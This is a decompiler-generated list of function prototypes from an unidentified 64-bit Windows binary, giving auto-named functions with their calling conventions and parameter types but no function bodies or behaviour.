__int64 __fastcall sub_14004E1F0(__int64 *a1);
__int64 __fastcall sub_14004E230(__int64 *a1);
void __fastcall sub_14004E270(__int64 a1);
// __int64 __fastcall sub_14004E2F0(_QWORD); weak
signed __int64 __fastcall sub_14004E3B0(__int64 a1);
// __int64 __fastcall  Concurrency::details::_Concurrent_queue_base_v4::`vcall'{8,{flat}}(_QWORD); weak
void *__fastcall sub_14004E460(__int64 a1, char a2);
_QWORD *__fastcall sub_14004E46C(__int64 a1, char a2);
void *__fastcall sub_14004E478(__int64 a1, char a2);
void *__fastcall sub_14004E484(__int64 a1, char a2);
void *__fastcall sub_14004E490(void *a1, char a2);
_QWORD *__fastcall sub_14004E4F0(void *a1, char a2);
_QWORD *__fastcall sub_14004E570(void *a1, char a2);
_QWORD *__fastcall sub_14004E5E0(void *a1, char a2);
void *__fastcall sub_14004E650(void *a1, char a2);
signed __int64 __fastcall sub_14004E690(__int64 a1);
__int64 __fastcall sub_14004E6A0(__int64 a1);
_QWORD *__fastcall sub_14004E6D0(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_14004E790(__int64 a1, _QWORD *a2);
void __noreturn sub_14004E7D0();
__int64 __fastcall sub_14004E870(__int64 a1, void *a2, __int64 a3, __int64 *a4);
__int64 __fastcall sub_14004E900(__int64 a1, void *a2, __int64 a3, _BYTE *a4);
char __fastcall sub_14004E990(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004E9B0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6);
__int64 __fastcall sub_14004EA20(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6);
__int64 __fastcall sub_14004EBE0(__int64 *a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6);
void __noreturn sub_14004F0B0();
void __noreturn sub_14004F170();
signed __int64 __fastcall sub_14004F230(unsigned __int64 a1);
signed __int64 __fastcall sub_14004F320(__int64 a1);
_QWORD *__fastcall sub_14004F3B0(__int64 a1);
__int64 __fastcall sub_14004F410(__int64 a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4, unsigned __int64 a5);
void *__fastcall sub_14004F500(__int64 a1, void *a2, unsigned __int64 a3, unsigned __int64 a4, unsigned __int64 Size);
char __fastcall sub_14004F540(__int64 a1, __int64 *a2);
__int64 __fastcall sub_14004F560(__int64 a1);
void __noreturn sub_14004F570();
void *__fastcall sub_14004F630(__int64 a1, void *a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14004F6B0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
char __fastcall sub_14004F830(__int64 a1);
signed __int64 __fastcall sub_14004FA80(__int64 a1);
__int64 __fastcall sub_14004FA90(__int64 a1);
_QWORD *__fastcall sub_14004FAA0(void *Src);
void **__fastcall sub_14004FF80(void *Src);
_QWORD *__fastcall sub_140050480(void *Src);
__int64 __fastcall sub_1400508A0(__int64 a1);
_QWORD *__fastcall sub_1400508D0(void *Src);
signed __int64 __fastcall sub_140050AA0(__int64 a1, unsigned __int64 a2);
char __fastcall sub_140050AC0(__int64 a1, const char *a2, __int64 a3, _QWORD *a4);
__int64 __fastcall sub_140050C30(__int64 *a1, __int64 a2);
__int64 __fastcall sub_140050C70(__int64 a1, __int64 a2);
signed __int64 sub_140050C80();
__int64 __fastcall sub_140050C90(__int64 a1);
void __fastcall sub_140050CA0(__int64 a1);
__int64 __fastcall sub_140050CB0(__int64 a1);
bool __fastcall sub_140050CC0(__int64 a1, __int64 a2);
char sub_140050CE0();
__int64 __fastcall sub_140050CF0(__int64 a1);
__int64 __fastcall sub_140050D00(__int64 a1, __int64 a2);
void __noreturn sub_140050E00();
__int64 __fastcall sub_140050EC0(__int64 a1);
__int64 __fastcall sub_140050ED0(__int64 a1, __int64 a2, __int64 a3);
void __noreturn sub_140051070();
__int64 __fastcall sub_140051130(__int64 a1);
__int64 __fastcall sub_140051150(__int64 a1);
__int64 __fastcall sub_140051160(__int64 a1);
__int64 __fastcall sub_140051170(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400511C0(__int64 a1, __int64 a2);
void __fastcall sub_140051210(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_1400512D0(__int64 a1);
__int64 __fastcall sub_1400512F0(__int64 a1);
__int64 __fastcall sub_140051310(__int64 a1);
void __noreturn sub_140051430();
void __fastcall sub_1400514F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
signed __int64 sub_140051800(__int64 a1, unsigned __int64 a2, unsigned __int64 a3, ...);
__int64 __fastcall sub_140051A40(__int64 a1);
__int64 __fastcall sub_140051A50(_QWORD *a1, __int64 a2, char a3);
__int64 __fastcall sub_140051AB0(__int64 a1, char a2);
__int64 __fastcall sub_140051AF0(__int64 a1, unsigned int *a2, char a3);
__int64 __fastcall sub_140051B40(__int64 a1, char *a2, unsigned __int64 a3);
void __noreturn sub_140051BD0();
void __noreturn sub_140051C90();
void __noreturn sub_140051D30();
void __noreturn sub_140051DD0();
void __fastcall sub_140051E70(__int64 a1);
__int64 __fastcall sub_140051EB0(__int64 a1);
__int64 __fastcall sub_140051EC0(_QWORD *a1, __int64 a2, int a3);
errno_t __fastcall sub_140051F40(_QWORD *a1, const void *a2, int a3);
void __noreturn sub_140051F90();
__int64 __fastcall sub_140052050(__int64 a1);
void __fastcall sub_140052060(_QWORD *a1, __int64 a2, __int64 a3);
void __noreturn sub_140052190();
void *__fastcall sub_140052250(__int64 a1, void *a2, __int64 a3, __int64 a4);
void __noreturn sub_1400522D0();
__int64 __fastcall sub_140052390(__int64 a1);
__int64 __fastcall sub_1400523A0(__int64 a1, unsigned __int8 (__fastcall ***a2)(_QWORD), __int64 a3);
void __fastcall sub_1400524E0(__int64 a1, int a2);
void __fastcall sub_1400525A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
void __fastcall sub_1400525F0(__int64 *a1, __int64 a2, __int64 a3, __int64 a4);
bool __fastcall sub_140052DD0(__int64 a1);
void __noreturn sub_140052E20();
__int64 __fastcall sub_140052EE0(_QWORD *a1, __int64 a2, unsigned int a3, __int64 a4);
__int64 __fastcall sub_140052F70(__int64 a1, __int64 a2, __int64 a3);
char __fastcall sub_140052FE0(_QWORD *a1, unsigned __int64 a2);
void __fastcall sub_140053060(__int64 a1, __int64 a2, __int64 a3);
void __fastcall sub_1400530E0(__int64 a1, __int64 a2, __int64 a3);
void __fastcall sub_140053160(__int64 a1, __int64 a2, __int64 a3);
unsigned __int64 __fastcall sub_1400531F0(_QWORD *a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_140053250(_QWORD *a1, unsigned __int64 a2);
signed __int64 __fastcall sub_1400532B0(__int64 a1, __int64 a2);
signed __int64 __fastcall sub_140053320(__int64 *a1, unsigned __int64 a2);
signed __int64 __fastcall sub_140053420(__int64 *a1, unsigned __int64 a2);
signed __int64 __fastcall sub_140053520(__int64 *a1, unsigned __int64 a2);
__int64 __fastcall sub_140053630(__int64 *a1, unsigned __int64 a2);
__int64 __fastcall sub_1400536D0(__int64 *a1, unsigned __int64 a2);
size_t *__fastcall sub_140053770(size_t *a1, size_t a2, char *a3, size_t a4);
// __int64 __fastcall sub_1400538D0(_QWORD, _QWORD); weak
void __fastcall sub_1400539D0(__int64 *a1, unsigned __int64 a2);
signed __int64 __fastcall sub_140053AA0(__int64 *a1, unsigned __int64 a2);
signed __int64 __fastcall sub_140053B90(__int64 *a1, unsigned __int64 a2, unsigned __int64 a3);
__int64 __fastcall sub_140053CE0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140053D40(__int64 a1);
void *__fastcall sub_140053D60(void *a1, char a2);
signed __int64 __fastcall sub_140053DA0(__int64 a1, const char *a2, __int64 a3, __int64 a4);
char __fastcall sub_140053E40(__int64 a1, const char *a2, __int64 a3, void *a4);
char __fastcall sub_140053F40(__int64 a1);
__int64 sub_140053F50();
__int64 __fastcall sub_140053F60(__int64 a1);
void *__fastcall sub_140054040(void *a1, char a2);
void __fastcall sub_140054070(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
char *__fastcall sub_140054190(__int64 a1, __int64 a2, __int64 a3);
size_t *__fastcall sub_1400542F0(void *Src, void *a2, _QWORD *a3);
_QWORD *__fastcall sub_1400543D0(void *Dst, unsigned int a2, unsigned int a3);
HCRYPTPROV *__fastcall sub_140054590(HCRYPTPROV *a1);
std::exception *__fastcall sub_140054640(std::exception *a1, const struct std::exception *a2);
// __int64 __fastcall sub_1400546C0(_QWORD, _QWORD); weak
_QWORD *__fastcall sub_140054870(_QWORD *a1, char a2);
BOOL __fastcall sub_1400548A0(__int64 a1, BYTE *a2, DWORD a3);
// __int64 __fastcall sub_140054960(_QWORD); weak
void __fastcall sub_140054A10(__int64 a1, __int64 a2, unsigned int a3);
signed __int64 *__fastcall sub_140054AB0(__int64 a1, __int64 a2, __int64 a3);
signed __int64 *__fastcall sub_140054C20(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140054E40(__int64 a1, __int64 a2);
__int64 __fastcall sub_140054F40(__int64 a1, __int64 a2, const char *a3, __int64 a4, _QWORD *a5, __int64 a6);
void __fastcall sub_1400551E0(__int64 a1);
__int64 __fastcall sub_140055250(__int64 a1);
__int64 __fastcall sub_140055258(); // weak
signed __int64 *__fastcall sub_140055260(__int64 a1, __int64 a2);
__int64 __fastcall sub_140055340(_DWORD *a1, __int64 a2);
void __fastcall sub_1400554F0(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_1400555B0(__int64 a1, _QWORD *a2, __int64 a3);
__int64 __fastcall sub_1400559F0(__int64 a1, int a2);
_QWORD *__fastcall sub_140055A10(void *Src);
__int64 __fastcall sub_140055D10(__int64 a1, __int64 a2);
char __fastcall sub_140055E50(__int64 a1, const char *a2, __int64 a3, _QWORD *a4);
void __fastcall sub_140055F30(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5);
char __fastcall sub_140056050(__int64 *a1, unsigned int a2, __int64 a3, __int64 *a4);
char __fastcall sub_1400563A0(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_1400565B0(__int64 a1, signed __int64 a2);
_QWORD *__fastcall sub_140056690(_QWORD *a1, unsigned __int64 a2);
void __fastcall sub_1400566F0(_QWORD *a1);
void *__fastcall sub_14005675C(__int64 a1, char a2);
void *__fastcall sub_140056770(void *a1, char a2);
void __fastcall sub_1400567A0(__int64 a1);
_QWORD *__fastcall sub_140056840(__int64 a1);
__int64 __fastcall sub_1400568D0(__int64 a1, __int64 a2, __int64 *a3, __int64 a4, __int64 a5, char a6);
__int64 __fastcall sub_1400569C0(__int64 a1, __int64 a2, __int64 *a3, __int64 a4, __int64 a5, char a6);
__int64 __fastcall sub_140056B70(__int64 a1);
__int64 __fastcall sub_140056BA0(_QWORD *a1);
signed __int64 __fastcall sub_140056BD0(_QWORD *a1, _BYTE *a2);
__int64 __fastcall sub_140056C50(__int64 *a1, __int64 a2);
__int64 __fastcall sub_140056D00(__int64 *a1, __int64 a2, __int64 a3);
bool __fastcall sub_140056DB0(_QWORD *a1);
_QWORD *__fastcall sub_140056DD0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140056E20(_QWORD *a1);
__int64 __fastcall sub_140056E50(_QWORD *a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140056EE0(__int64 a1);
signed __int64 __fastcall sub_140056F10(__int64 a1, _BYTE *a2);
__int64 __fastcall sub_140056F50(__int64 *a1, __int64 a2);
__int64 __fastcall sub_140057000(__int64 *a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_1400570B0(_QWORD *a1, char *a2, unsigned __int64 a3);
__int64 __fastcall sub_140057240(_QWORD *a1, _QWORD *a2);
__int64 __fastcall sub_140057270(__int64 a1, __int64 a2, unsigned __int64 *a3, __int64 a4, char a5);
__int64 __fastcall sub_140057440(__int64 a1, __int64 a2, unsigned __int64 *a3, __int64 a4, char a5);
// __int64 __fastcall sub_140057570(_QWORD, _QWORD, _QWORD); weak
__int64 __fastcall sub_140057660(__int64 a1, __int64 a2, _DWORD *a3, char a4);
__int64 __fastcall sub_140057720(__int64 a1, __int64 a2, _DWORD *a3, char a4);
__int64 __fastcall sub_1400577E0(__int64 a1, __int64 a2, _DWORD *a3, char a4);
__int64 __fastcall sub_140057870(__int64 a1, __int64 a2, _DWORD *a3, char a4);
__int64 __fastcall sub_140057900(__int64 a1, __int64 a2);
__int64 __fastcall sub_140057940(__int64 a1, __int64 a2);
// __int64 __fastcall sub_1400579B0(__int64); weak
__int64 __fastcall sub_140057B40(__int64 a1, __int64 a2, __int64 a3, char a4, int a5, _QWORD *a6, _QWORD *a7);
_QWORD *__fastcall sub_140057C60(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_140057D20(__int64 a1, __int64 a2, __int64 a3, int a4);
std::exception *__fastcall sub_140057DD0(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_140057E00(std::exception *a1, const struct std::exception *a2);
_DWORD *__fastcall sub_140057E80(_DWORD *a1);
__int64 __fastcall sub_140057F50(__int64 a1, __int64 a2, __int64 a3, int a4);
void __fastcall sub_140058010(__int64 a1);
void __fastcall sub_140058040(__int64 a1);
void __fastcall sub_1400580A0(__int64 a1);
void __fastcall sub_140058150(__int64 a1);
// __int64 sub_1400581C0(void); weak
void __fastcall sub_140058230(__int64 a1);
_QWORD *__fastcall sub_1400582B8(__int64 a1, char a2);
void *__fastcall sub_1400582C4(__int64 a1, char a2);
void *__fastcall sub_1400582D0(__int64 a1, char a2);
void *__fastcall sub_1400582DC(__int64 a1, char a2);
_QWORD *__fastcall sub_1400582F0(void *a1, char a2);
void *__fastcall sub_140058360(void *a1, char a2);
void *__fastcall sub_140058390(void *a1, char a2);
void *__fastcall sub_140058430(void *a1, char a2);
__int64 __fastcall sub_140058460(__int64 a1, __int64 a2);
__int64 __fastcall sub_140058490(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400584C0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400584F0(__int64 a1, void *a2, __int64 a3, _DWORD *a4);
__int64 __fastcall sub_140058580(__int64 a1, void *a2, __int64 a3, _DWORD *a4);
__int64 __fastcall sub_140058610(_QWORD *a1);
__int64 __fastcall sub_140058670(__int64 a1, __int64 a2, __int64 a3);
char __fastcall sub_1400586B0(__int64 a1, __int64 a2, unsigned __int8 a3, unsigned int a4);
char __fastcall sub_140058720(__int64 a1, __int64 a2, unsigned int a3, unsigned __int8 a4);
__int64 __fastcall sub_140058790(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140058810(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140058890(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_1400588E0(_QWORD *a1, __int64 a2, _QWORD *a3, __int64 a4, __int64 a5, char a6);
__int64 __fastcall sub_140058970(_QWORD *a1, _QWORD *a2);
__int64 __fastcall sub_1400589A0(__int64 a1);
__int64 __fastcall sub_1400589B0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400589E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140058A30(__int64 a1);
void __fastcall sub_140058A90(__int64 a1, const void *a2);
char __fastcall sub_140058B70(_DWORD *a1, unsigned __int8 a2, int a3, unsigned __int8 a4);
char __fastcall sub_140058C20(__int64 a1, unsigned __int8 a2, unsigned int a3, unsigned __int8 a4);
void __fastcall sub_140058C90(__int64 a1);
unsigned __int64 __fastcall sub_140058DD0(_QWORD *a1, char *a2);
__int64 __fastcall sub_140058EA0(_QWORD *a1);
__int64 __fastcall sub_140058EF0(_QWORD *a1, __int64 *a2);
char __fastcall sub_140058F60(_BYTE *a1);
__int64 __fastcall sub_140058F90(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140059080(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4, unsigned __int64 a5);
__int64 __fastcall sub_1400590E0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_140059140(__int64 a1, __int64 a2, int a3);
void __fastcall sub_1400591A0(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_1400591E0(__int64 a1);
__int64 __fastcall sub_1400591F0(__int64 a1, __int64 a2, _QWORD *a3, _QWORD *a4, __int64 *a5);
__int64 *__fastcall sub_1400593A0(__int64 a1, __int64 a2, __int64 *a3, _QWORD *a4, __int64 *a5);
char __fastcall sub_140059480(__int64 a1, char a2, char a3);
char __fastcall sub_1400595C0(__int64 a1, __int64 a2, unsigned __int8 a3);
__int64 __fastcall sub_1400595E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140059720(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_140059880(__int64 a1, __int64 a2);
__int64 __fastcall sub_140059900(__int64 *a1, unsigned int a2);
__int64 __fastcall sub_140059FD0(__int64 a1, __int64 a2, __int64 a3);
char __fastcall sub_14005A120(_DWORD *a1, int a2, unsigned __int8 a3);
char __fastcall sub_14005A1E0(__int64 a1, unsigned int a2, unsigned __int8 a3);
__int64 __fastcall sub_14005A230(__int64 a1, __int64 a2);
__int64 __fastcall sub_14005A280(__int64 a1, __int64 a2);
__int64 sub_14005A2D0();
__int64 __fastcall sub_14005A310(__int64 a1);
__int64 __fastcall sub_14005A320(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14005A350(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14005A3B0(_QWORD *a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14005A400(__int64 a1, __int64 a2, __int64 a3);
void __fastcall sub_14005A430(__int64 *a1, __int64 a2, unsigned __int64 a3);
__int64 __fastcall sub_14005A590(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14005A600(__int64 a1, int a2, __int64 a3, __int64 a4, __int64 a5, char a6, __int64 a7);
size_t __fastcall sub_14005A690(__int64 a1, const void *a2, unsigned __int64 a3);
unsigned __int64 __fastcall sub_14005A720(__int64 a1, unsigned __int64 a2, unsigned __int64 a3);
__int64 __fastcall sub_14005A7B0(char a1, int a2, char a3);
unsigned __int64 __fastcall sub_14005A7D0(__int64 a1, __int64 a2, __int64 a3, int a4, char a5);
__int64 __fastcall sub_14005A980(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
void __fastcall sub_14005A9F0(_QWORD *a1, char *a2, __int64 a3);
// __int64 __fastcall sub_14005AA90(char, _DWORD, char); weak
__int64 __fastcall sub_14005AF50(char a1, int a2, char a3);
__int64 __fastcall sub_14005AF70(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
__int64 __fastcall sub_14005AFE0(__int64 a1, __int64 a2, __int64 a3);
void __fastcall sub_14005B030(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_14005B180(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14005B1D0(_QWORD *a1, __int64 a2, __int64 *a3, __int64 a4, char a5);
// __int64 __fastcall sub_14005B220(_DWORD); weak
void __fastcall sub_14005B2D0(__int64 *a1);
void __fastcall sub_14005B310(_QWORD *a1);
// __int64 __fastcall sub_14005B350(_QWORD); weak
__int64 sub_14005B3F0();
_QWORD *sub_14005B480();
__int64 __fastcall sub_14005B730(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6);
__int64 __fastcall sub_14005B860(signed int a1);
// __int64 __fastcall sub_14005B8E0(_QWORD); weak
__int64 __fastcall sub_14005BBD0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned __int8 (__fastcall ***a5)(_QWORD, int *));
__int64 __fastcall sub_14005C1D0(__int64 a1);
// void __usercall sub_14005C1F0(int a1@<edx>, __int64 a2@<rcx>, __int64 a3@<r8>, unsigned int a4@<r9d>);
__int64 __fastcall sub_14005CFC0(int); // idb
char __fastcall sub_14005D120(__int64 a1);
// __int64 __usercall sub_14005D250@<rax>(int@<ecx>, int, int, char, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int); idb
char __fastcall sub_14005D790(__int64 a1, __int64 a2);
// __int64 __fastcall sub_14005DC30(_QWORD, _QWORD); weak
__int64 __fastcall sub_14005DDF0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
char __fastcall sub_14005E0E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14005E360(_QWORD); // weak
char __fastcall sub_14005E370(__int64 a1, __int64 a2, unsigned int a3);
// __int64 __fastcall sub_14005E5A0(_QWORD); weak
// __int64 __fastcall sub_14005E650(_QWORD); weak
bool __fastcall sub_14005E8F0(__int64 a1, unsigned int a2);
bool __fastcall sub_14005E980(__int64 a1, __int64 a2, unsigned int a3);
char __fastcall sub_14005EA10(_QWORD *a1, unsigned __int64 a2, _DWORD *a3);
__m128i *__fastcall sub_14005EA80(unsigned __int64 *a1, __m128i *a2, __int128 *a3, unsigned __int64 a4, _BYTE *a5);
signed __int64 __fastcall sub_14005EC40(unsigned __int64 *a1, _QWORD *a2, unsigned __int64 a3);
char *__fastcall sub_14005EE60(__int64 a1, unsigned __int64 a2);
char *__fastcall sub_14005EF20(__int64 a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_14005EFF0(_QWORD *a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_14005F080(_QWORD *a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_14005F110(_QWORD *a1, unsigned __int64 a2);
__m128i *__fastcall sub_14005F1E0(signed __int64 *a1);
__m128i *__fastcall sub_14005F290(signed __int64 *a1, __m128i *a2, __int128 *a3, __m128i *a4);
unsigned __int64 __fastcall sub_14005F500(unsigned __int64 *a1, unsigned __int64 a2, _DWORD *a3);
__m128i *__fastcall sub_14005F5D0(signed __int64 *a1, unsigned __int64 a2, char a3);
__int64 __fastcall sub_14005F770(__int64 a1, __int64 a2, char a3);
__int64 __fastcall sub_14005F7E0(__int64 a1, __int64 a2, char a3);
// __int64 __fastcall sub_14005F840(_QWORD); weak
void __fastcall sub_14005F8B0(__int64 a1);
void *__fastcall sub_14005F91C(__int64 a1, char a2);
void *__fastcall sub_14005F928(__int64 a1, char a2);
void *__fastcall sub_14005F940(void *a1, char a2);
void *__fastcall sub_14005F970(void *a1, char a2);
int *__fastcall sub_14005F9A0(int **a1, __int64 a2);
__int64 __fastcall sub_14005FB90(__int64 a1, __int64 *a2);
__int64 __fastcall sub_14005FFA0(__int64 a1);
__int64 __fastcall sub_14005FFF0(__int64 a1, unsigned __int64 *a2);
char __fastcall sub_1400600B0(__int64 a1, _QWORD *a2, _BYTE *a3);
__int64 __fastcall sub_140060170(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
void __fastcall sub_1400601B0(_QWORD *a1, _QWORD *a2);
void __fastcall sub_140060300(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_1400605C0(__int64 *a1);
signed __int64 __fastcall sub_140060610(_QWORD *a1, __int64 a2, unsigned __int64 a3);
signed __int64 __fastcall sub_140060690(_QWORD *a1, unsigned __int64 a2);
__int64 __fastcall sub_1400607E0(__int64 *a1, unsigned int a2);
bool __fastcall sub_1400608C0(__int64 a1);
char __fastcall sub_140060910(__int64 a1, char a2);
void __fastcall sub_140060990(__int64 a1);
__int64 __fastcall sub_1400609E0(__int64 a1);
__int64 __fastcall sub_140060A60(__int64 a1, __int64 a2, unsigned __int64 *a3);
void __fastcall sub_140060AD0(_QWORD *a1, unsigned __int64 a2);
_QWORD *__fastcall sub_140060BD0(__int64 a1, __int64 a2, __int64 a3);
std::exception *__fastcall sub_140060C30(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_140060CB0(std::exception *a1, const struct std::exception *a2);
_DWORD *__fastcall sub_140060CE0(_DWORD *a1);
__int64 __fastcall sub_140060DC0(__int64 a1);
__int64 __fastcall sub_140060DE0(__int64 a1, _QWORD *a2);
void __fastcall sub_140060DF0(__int64 a1, __int64 *a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140060F80(__int64 a1);
// __int64 __fastcall sub_140060FF0(__int64, __int64, __int64, char, _DWORD, _DWORD); weak
__int64 __fastcall sub_1400611D0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140061320(__int64 a1, __int64 a2);
void __fastcall sub_140061550(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3);
__int64 __fastcall sub_140061610(_DWORD *a1, _QWORD *a2);
unsigned __int64 __fastcall sub_140061660(__int64 *a1, unsigned __int64 a2, unsigned __int64 a3);
void *__fastcall sub_1400617E0(_DWORD *a1, unsigned int a2, char a3);
__int64 __fastcall sub_140061880(_QWORD *a1);
__int64 __fastcall sub_140061890(__int64 a1, void *a2, unsigned __int64 a3);
// __int64 __fastcall sub_1400619E0(_QWORD, _QWORD, _QWORD); weak
__int64 __fastcall sub_140061C20(__int64 a1, unsigned __int64 *a2, __int64 a3);
void __fastcall sub_140061C50(_DWORD *a1);
void __fastcall sub_140061C80(_OWORD *a1);
__int64 __fastcall sub_140061CA0(_DWORD *a1, _DWORD *a2);
__int64 __fastcall sub_140062E60(const __m128i *a1, __int64 a2);
_BOOL8 __fastcall sub_140062F10(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
_BOOL8 __fastcall sub_140062F60(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
// __m128i *__usercall sub_140062FB0@<rax>(const __m128i *a1@<rdx>, __m128i *a2@<rcx>, __int16 a3@<r10w>);
__int16 __fastcall sub_140063608(const __m128i *a1, __int64 a2, __m128i *a3, __int64 a4);
__int64 __fastcall sub_140063888(const __m128i *a1, __int64 a2, __m128i *a3);
__int64 __fastcall sub_1400639D0(const __m128i *a1, unsigned __int64 *a2, __int64 a3);
unsigned __int64 __fastcall sub_140064880(void (__fastcall *a1)(__m128i *, __int64, _QWORD), void (__fastcall *a2)(__m128i *, __m128i *, __m128i *, __m128i *, __int64, __int64), __int64 a3, unsigned int a4, __m128i *a5, const __m128i *a6, __m128i *a7, unsigned __int64 a8, char a9);
signed __int64 __fastcall sub_140064B80(_QWORD *a1, unsigned __int64 *a2);
signed __int64 __fastcall sub_140064CA0(__m128i *a1, __m128i *a2, __m128i *a3, __m128i *a4, const __m128i *a5, unsigned int a6);
signed __int64 __fastcall sub_140064DA0(__m128i *a1, __m128i *a2, unsigned int a3);
signed __int64 __fastcall sub_140064E20(__m128i *a1, __m128i *a2, __m128i *a3, __m128i *a4, const __m128i *a5, unsigned int a6);
signed __int64 __fastcall sub_140064F20(__m128i *a1, __m128i *a2, unsigned int a3);
unsigned __int64 __fastcall sub_140064FA0(__int64 a1, __m128i *a2, const __m128i *a3, __m128i *a4, unsigned __int64 a5, char a6);
unsigned __int64 __fastcall sub_140065060(__int64 a1, __m128i *a2, const __m128i *a3, __m128i *a4, unsigned __int64 a5, char a6);
__int64 sub_1400652B0();
__int64 sub_140065440();
_DWORD *__fastcall sub_1400654E0(__int64 a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_140065580(__int64 a1, __m128i *a2, const __m128i *a3, __m128i *a4);
unsigned __int64 __fastcall sub_140065AF0(__int64 a1, __m128i *a2, const __m128i *a3, __m128i *a4);
void __fastcall sub_140065B10(__int64 a1, char *a2, unsigned int a3);
__int64 __fastcall sub_140066730(__int64 a1, const void *a2, rsize_t a3);
void *__fastcall sub_140066780(__int64 a1, __int64 a2, __int64 a3, int a4, unsigned __int64 a5);
__int64 __fastcall sub_1400668B0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
void __fastcall sub_140066980(__int64 a1);
void __fastcall sub_1400669C0(__int64 a1, unsigned int a2);
errno_t __fastcall sub_140066AB0(__int64 a1);
__int64 __fastcall sub_140066B20(__int64 a1, __int64 a2, unsigned int a3, __int64 a4);
__int64 __fastcall sub_140066B90(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140066C80(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140066D70(__int64 a1, __int64 a2, __int64 a3);
int __fastcall sub_140066E60(_DWORD *a1, unsigned __int8 *a2, unsigned int a3, char a4);
void __fastcall sub_140066F30(__int64 a1, __int64 a2);
void __fastcall sub_1400670C0(__int64 a1, __int64 a2);
void __fastcall sub_140067290(rsize_t *a1, __int64 a2);
__int64 __fastcall sub_140067440(__int64 a1, __int64 a2, unsigned __int64 a3, int a4, char a5);
__int64 __fastcall sub_140067650(__int64 a1, __int64 a2, unsigned __int64 a3, int a4, char a5);
unsigned __int64 __fastcall sub_1400678E0(__int64 a1, __int64 a2, __int64 a3, int a4, char a5);
__int64 __fastcall sub_140067B40(__int64 a1, __int64 a2, _QWORD *a3, char a4);
__int64 __fastcall sub_140067C00(__int64 a1, __int64 a2, _QWORD *a3, char a4);
__int64 __fastcall sub_140067C90(__int64 a1, void *a2, __int64 a3, __int64 *a4);
__int64 __fastcall sub_140067D20(__int64 a1, __int64 a2);
LARGE_INTEGER sub_140067D70();
LARGE_INTEGER sub_140067E60();
_QWORD *__fastcall sub_140067F60(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_140068010(_QWORD *a1, __int64 a2, __int64 a3, __int64 **a4);
_QWORD *__fastcall sub_1400680B0(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_140068160(_QWORD *a1, __int64 a2, __int64 a3, __int64 **a4);
_QWORD *__fastcall sub_140068200(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_1400682B0(_QWORD *a1, __int64 a2, __int64 a3, __int64 **a4);
